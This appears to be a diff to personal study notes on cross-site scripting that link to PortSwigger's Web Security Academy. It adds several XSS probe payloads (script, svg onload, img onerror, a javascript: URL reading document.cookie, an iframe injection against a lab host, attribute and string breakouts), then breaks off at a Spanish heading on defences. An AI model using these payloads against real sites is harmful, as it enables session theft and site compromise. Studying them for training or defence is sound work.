@@ -1,10 +1,35 @@
 https://portswigger.net/web-security/cross-site-scripting
 
+```
 <script>alert(1)</script>
+```
 
+```
+"><svg onload=alert(1)>
+```
 
+```
+<img src="que-dé-error" onerror="alert(1)">
+```
+
+```
+javascript:alert(document.cookie)
+```
+
+```
+<iframe src="https://0a7d003c0348412c80570321006c009b.web-security-academy.net/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>
+```
+
+```
+GET /?search="onmouseover="alert(1)
+```
+
+```
+<h1>0 search results for ''-alert(1)-''</h1>
+```
 
 ---
+
 
 Aquí van las defensas principales contra este tipo de ataque (XSS que roba cookies):
 
